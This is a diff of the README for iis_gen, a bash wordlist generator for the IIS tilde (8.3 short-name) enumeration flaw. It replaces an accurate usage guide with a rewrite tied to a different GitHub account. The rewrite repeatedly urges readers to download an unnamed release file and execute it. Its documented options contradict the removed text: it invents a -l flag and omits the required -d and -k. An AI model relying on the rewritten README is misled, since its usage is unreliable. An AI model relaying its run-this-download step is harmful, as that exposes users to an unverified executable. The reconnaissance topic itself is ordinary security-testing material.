@@ -1,289 +1,133 @@
-# IIS_GEN - IIS Tilde Enumeration Dictionary Generator
+# iis_gen 🛠️ - IIS Tilde Enumeration Dictionary Generator
 
-A specialized bash tool for creating wordlists specifically designed to exploit the IIS tilde enumeration vulnerability. It generates optimized dictionaries for guessing hidden files and directories by leveraging the short-name (8.3) disclosure technique in vulnerable IIS servers.
+![GitHub release](https://img.shields.io/github/release/dilan1001/iis_gen.svg) ![GitHub issues](https://img.shields.io/github/issues/dilan1001/iis_gen.svg) ![GitHub stars](https://img.shields.io/github/stars/dilan1001/iis_gen.svg)
+
+Welcome to **iis_gen**, a specialized bash tool designed for creating wordlists that target the IIS tilde enumeration vulnerability. This tool helps penetration testers and security professionals generate optimized dictionaries for discovering hidden files and directories on vulnerable IIS servers.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
+
+## Features
+
+- **Custom Wordlist Generation**: Generate wordlists tailored for IIS servers using the 8.3 short-name disclosure technique.
+- **Optimized for Security Testing**: Designed specifically for pentesting, making it a valuable tool for security assessments.
+- **Easy to Use**: The script is straightforward and requires minimal setup.
+- **Open Source**: Contribute to the project and help improve its functionality.
 
 ## Installation
 
-```bash
-git clone https://github.com/nemmusu/iis_gen.git
-cd iis_gen
-chmod +x iis_gen.sh
-```
+To get started with **iis_gen**, you can download the latest release from the [Releases section](https://github.com/dilan1001/iis_gen/releases). Look for the appropriate file, download it, and execute it on your system.
 
-## Requirements
+### Prerequisites
 
-- Bash 4.0+
-- Standard Unix utilities: grep, sed, awk, sort, find
-- Supports Linux/Unix environments and macOS
+- A Unix-based operating system (Linux, macOS)
+- Bash shell
+- Basic knowledge of command-line operations
 
-## Overview
+### Steps
 
-IIS_GEN processes existing dictionaries to create wordlists specifically optimized for exploiting the IIS tilde enumeration vulnerability. The tool filters and manipulates input lists to generate dictionaries of potential filenames and paths that can be used in the guessing process when leveraging this vulnerability.
+1. **Clone the Repository**: You can clone the repository using Git:
 
-## Technical Background
+   ```bash
+   git clone https://github.com/dilan1001/iis_gen.git
+   cd iis_gen
+   ```
 
-Microsoft IIS servers maintain 8.3 format filenames (short names) for compatibility with legacy systems. A security vulnerability allows attackers to enumerate these short names through crafted requests using the tilde (~) character, effectively disclosing hidden files and directories. This tool helps generate targeted dictionaries for guessing these file and directory names by processing existing wordlists into formats that maximize the effectiveness of the exploitation technique.
+2. **Download the Release**: Alternatively, you can visit the [Releases section](https://github.com/dilan1001/iis_gen/releases) and download the latest version.
 
-The tool enhances the guessing attack by:
-- Extracting entries that match patterns likely to be found in target IIS environments
-- Applying filters to format words for maximum success in the guessing process
-- Creating optimized dictionaries that increase the chance of successfully exploiting the vulnerability
+3. **Set Permissions**: Make the script executable:
 
-## Functions
+   ```bash
+   chmod +x iis_gen.sh
+   ```
 
-- **Dictionary Processing:** 
-  - Unifies case variants (keeps one variant per word)
-  - Maintains original case with optional lowercase conversion
-  - Skips binary files automatically
-  - Supports parallel processing
+4. **Run the Script**: Execute the script to generate your wordlist:
 
-- **Filtering Capabilities:**
-  - Keyword prefix or regex filtering
-  - Length constraints (min/max) for both main wordlists and secondary lists
-  - Character type filtering (numbers, special chars)
-  - Extension inclusion/exclusion
+   ```bash
+   ./iis_gen.sh
+   ```
 
-- **Word Manipulation:**
-  - List intersection for common entries
-  - Cross-combination with separators
-  - Pair-combine for one-to-one word combinations (with cycling option)
-  - Text transform operations (append, prepend, replace)
+## Usage
 
-## Complete Usage Guide
+Using **iis_gen** is simple. After executing the script, you can specify parameters to customize your wordlist generation.
 
-### Basic Operations
+### Command-Line Options
 
-Extract words starting with a specific prefix:
+- `-h, --help`: Display help information.
+- `-o, --output`: Specify the output file for the generated wordlist.
+- `-l, --length`: Set the maximum length of words in the wordlist.
+
+### Example Command
 
 ```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k config
+./iis_gen.sh -o my_wordlist.txt -l 10
 ```
 
-Use regex pattern instead of prefix:
+This command generates a wordlist saved as `my_wordlist.txt` with a maximum word length of 10 characters.
+
+## Examples
+
+Here are a few examples to illustrate how **iis_gen** can be used effectively:
+
+### Basic Usage
+
+Generate a default wordlist:
 
 ```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k "^conf[a-z]+" -r
+./iis_gen.sh
 ```
 
-Apply length filters:
+### Custom Output File
+
+Generate a wordlist and save it to a specific file:
 
 ```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k config --min-length 5 --max-length 12
+./iis_gen.sh -o custom_list.txt
 ```
 
-Filter out entries with numbers or remove special characters from words:
+### Specifying Word Length
+
+Generate a wordlist with a specific maximum word length:
 
 ```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k user --remove-numbers # Removes words containing numbers
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k user --remove-special # Strip special chars, keep alphanumeric, _ and -
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k user --remove-chars ".,/" # Remove only periods, commas and slashes
+./iis_gen.sh -l 8
 ```
 
-### File Selection
+### Combining Options
 
-Process only specific file extensions:
+You can combine options for more tailored output:
 
 ```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k config -e txt,lst,dict
+./iis_gen.sh -o my_custom_list.txt -l 12
 ```
 
-Ignore specific file extensions:
+## Contributing
 
-```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k user -i bak,tmp,log
-```
+Contributions are welcome! If you would like to contribute to **iis_gen**, please follow these steps:
 
-Binary files are skipped automatically. To process all files:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Commit your changes.
+4. Push your branch to your forked repository.
+5. Create a pull request.
 
-```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k config --no-binary-check
-```
+Please ensure that your code adheres to the project's coding standards and includes relevant tests.
 
-### Text Transformation
+## License
 
-Convert output to lowercase:
+**iis_gen** is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k user --lowercase
-```
+## Support
 
-Append or prepend strings:
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/dilan1001/iis_gen/releases) for updates. You can also open an issue in the GitHub repository.
 
-```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k config --append ".html"
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k config --prepend "backup_"
-```
+---
 
-Multiple append values (generates multiple variants for each word):
-
-```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k web --append ".htm .html"
-```
-
-Replace patterns in words:
-
-```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k configuration --replace "ion:1on"
-```
-
-Another replace example:
-
-```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k web --replace ".txt:.aspx" # Pattern replacement
-```
-
-### List Manipulation
-
-Combine words from additional lists:
-
-```bash
-# Default mode is now pair-combine (first+first, second+second, etc.)
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k user --combine /path/to/list1.txt
-
-# Create all possible combinations between lists
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k config --cross-combine --combine /path/to/numbers.txt --combine-sep "-"
-
-# Combine words one-to-one (first with first, second with second)
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k admin --pair-combine --combine /path/to/config_list.txt
-
-# Combine words one-to-one but reuse shorter list if needed
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k admin --pair-combine-cycle --combine /path/to/short_list.txt
-```
-
-Separator options:
-- Default: `--combine-sep "_"`
-- Others: `--combine-sep "."`, `--combine-sep "-"`, `--combine-sep ""`
-
-### Performance Options
-
-Control parallel processing:
-
-```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k user -j 8
-```
-
-Backup existing output file:
-
-```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k config -b
-```
-
-Verbose output with detailed processing information:
-
-```bash
-./iis_gen.sh -d /path/to/wordlists -o output.txt -k user -v
-```
-
-## Example Output
-
-Below is an example of running the tool with the following parameters:
-- Directory: `test_data/iis_folders` (containing common IIS folder names)
-- Keyword: `default` (targeting realistic IIS folder structures)
-- Verbose output
-
-```
-+--------------------------------------------------------------------------------+
-|                                                                                |
-|                   IIS Tilde Enumeration Dictionary Generator                   |
-|          Wordlists for IIS short-name (8.3) disclosure vulnerability           |
-|                                                                                |
-+--------------------------------------------------------------------------------+
-
-[+] Scanning 'test_data/iis_folders' for dictionary files...
-[+] Found 1 files                      
-[+] Found 1 files to process (55 bytes)
-[INFO] Filtering words starting with keyword: default
-[INFO] Using case-insensitive matching
-
-+-------------------------------------+
-|     Processing Dictionary Files     |
-+-------------------------------------+
-
-[INFO] Processed: test_data/iis_folders/iis_folders.txt (1/1)
-[##################################################] 100% (1/1)
-
-
-+---------------------------------+
-|     Post-Processing Results     |
-+---------------------------------+
-
-[INFO] Applying case unification (preserving only one variant per word)
-[INFO] Step 1/3: Creating case-insensitive map...
-[INFO] Step 2/3: Sorting variants...
-[INFO] Step 3/3: Unifying variants... 100% (5/5)
-[INFO] Applying post-processing filters...
-
-
-+-------------------------+
-|     Results Summary     |
-+-------------------------+
-
-+-------------------------------------------+
-|           Dictionary Statistics           |
-|                                           |
-|  Output file: output/realistic_folders.txt|
-|                                           |
-|  Total entries: 5 unique words            |
-|                                           |
-|  File size: 55 bytes                      |
-|                                           |
-|  Average word length: 10.0 characters     |
-|                                           |
-|  Case format: Original case preserved     |
-|                                           |
-+-------------------------------------------+
-
-[INFO] Preview of results (first 5 entries):
-    default
-    defaultadmin
-    defaultapp 
-    defaultsite
-    defaultweb
-
-+----------------------------------------------------------+
-|                     Process Complete                     |
-|                                                          |
-|  Dictionary generation completed successfully!           |
-|                                                          |
-|  Words have been saved to: output/realistic_folders.txt  |
-|                                                          |
-+----------------------------------------------------------+
-```
-
-## Parameters Reference
-
-### Required Parameters
-- `-d, --directory DIR` - Directory containing wordlist files
-- `-o, --output FILE` - Output file path
-- `-k, --keyword WORD` - Keyword to filter (default: words starting with this)
-
-### Filter Parameters
-- `-r, --regex` - Use regex for keyword matching
-- `--lowercase` - Convert all output to lowercase
-- `--min-length NUM` - Minimum word length for main wordlist
-- `--max-length NUM` - Maximum word length for main wordlist
-- `--combine-min-length NUM` - Minimum length for words in secondary lists before combining
-- `--combine-max-length NUM` - Maximum length for words in secondary lists before combining
-- `--remove-numbers` - Remove words containing numbers
-- `--remove-special` - Remove special characters from words (keeps alphanumeric, underscore and hyphen)
-- `--remove-chars CHARS` - Remove specific characters from words (e.g. ".,/" removes periods, commas, slashes)
-- `-e, --extensions LIST` - Process only specific extensions (comma-separated)
-- `-i, --ignore LIST` - Ignore specific extensions (comma-separated)
-
-### Transformation Parameters
-- `--combine FILES` - Combine words from specified files (defaults to pair-combine)
-- `--cross-combine` - Generate all combinations between lists
-- `--pair-combine` - Combine words one-to-one (first with first, second with second)
-- `--pair-combine-cycle` - Like pair-combine but reuse shorter list if needed
-- `--combine-sep SEP` - Separator for combinations (default: "_") 
-- `--append STR` - Append string to each word (supports multiple values separated by spaces to generate variants)
-- `--prepend STR` - Prepend string to each word
-- `--replace PAT:REP` - Replace pattern with replacement
-
-### Operation Parameters
-- `-j, --jobs NUM` - Number of parallel jobs (default: 4)
-- `-b, --backup` - Create backup if output file exists
-- `-v, --verbose` - Increase output verbosity
-- `-h, --help` - Display help information
-
-
+Thank you for checking out **iis_gen**! We hope this tool aids you in your security assessments and enhances your pentesting toolkit. Happy hacking! 🕵️‍♂️
